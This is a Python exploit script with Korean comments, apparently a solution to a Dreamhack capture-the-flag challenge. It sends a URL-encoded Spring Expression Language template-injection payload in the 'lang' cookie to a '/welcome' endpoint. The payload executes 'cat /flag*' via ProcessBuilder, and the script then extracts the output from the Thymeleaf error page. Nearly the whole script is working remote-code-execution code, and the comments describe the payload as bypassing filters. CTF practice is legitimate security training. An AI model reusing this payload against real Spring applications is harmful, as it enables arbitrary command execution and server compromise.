import requests
import urllib.parse
import re

# ==========================================
# [설정 부분]
# ==========================================
# ⚠️ 현재 살아있는 인스턴스의 포트 번호로 반드시 수정해 주세요!
TARGET_URL = "http://host3.dreamhack.games:15213" 

print("==========================================")
print(f"[DEBUG] Target Server : {TARGET_URL}")
print("==========================================")

# ==========================================
# [페이로드 구성]
# ==========================================
# 1. 실행할 리눅스 명령어
# 가장 유력한 경로인 루트의 flag 관련 파일들을 바로 읽어버립니다.
linux_cmd = "cat /flag*"
print(f"[DEBUG] Linux Command : {linux_cmd}")

# 2. SpEL 인젝션 페이로드 (StreamUtils 방식 - 필터링 완벽 우회)
payload = f"__${{new String(T(org.springframework.util.StreamUtils).copyToByteArray(new ProcessBuilder('sh', '-c', '{linux_cmd}').start().getInputStream()))}}__::.x"
print(f"[DEBUG] SpEL Payload  : {payload}")

# 3. 안전한 전송을 위한 URL 인코딩
# Tomcat 서버가 특수문자({, }, 공백 등) 때문에 400 Bad Request를 뱉는 것을 방지합니다.
encoded_payload = urllib.parse.quote(payload)
print(f"[DEBUG] Encoded Cookie: lang={encoded_payload[:50]}...")
print("==========================================\n")

# ==========================================
# [익스플로잇 실행 (One-Shot)]
# ==========================================
# requests.Session()의 불안정한 쿠키 관리를 버리고, 헤더에 직접 강제 주입합니다.
headers = {
    "Cookie": f"lang={encoded_payload}"
}

try:
    print("[*] '/welcome' 엔드포인트로 익스플로잇 직접 타격! (쿠키 헤더 주입)")
    # 리다이렉트를 탈 필요 없이 바로 welcome으로 갑니다.
    res = requests.get(f"{TARGET_URL}/welcome", headers=headers, timeout=10)
    
    print(f"    -> Status Code : {res.status_code}")
    print(f"    -> Response Length: {len(res.text)} bytes")

    print("\n================== [서버 응답 본문 분석] ==================")
    
    # 500 에러 페이지 내에서 정규표현식으로 DH{...} 플래그 추출
    flags = re.findall(r'DH\{.*?\}', res.text)

    if flags:
        print("\n🎉 [SUCCESS] 에러 페이지에서 진짜 플래그를 뽑아냈습니다!!!")
        for idx, flag in enumerate(flags):
            print(f"  -> 🚩 {flag}")
    else:
        print("[-] 정규식으로 플래그를 찾지 못했습니다. 명령어 실행 결과가 에러 메시지에 묻혀있는지 확인합니다:\n")
        
        # 명령어 실행 결과는 Thymeleaf의 "Error resolving template [결과값]" 에러 메시지 안에 출력됩니다.
        match = re.search(r'Error resolving template \[(.*?)\]', res.text, re.DOTALL)
        if match:
            print("[+] 💻 서버 내부 명령어 실행 결과:")
            # 뒤에 붙은 ::.x/welcome 찌꺼기를 제거하고 출력
            result_text = match.group(1).replace('::.x/welcome', '').strip()
            print(f"\n{result_text}\n")
        else:
            print("[DEBUG] 예상치 못한 응답 본문 (앞 1000자):")
            print(res.text[:1000])

except Exception as e:
    print(f"[-] 익스플로잇 실행 중 오류 발생:\n{e}")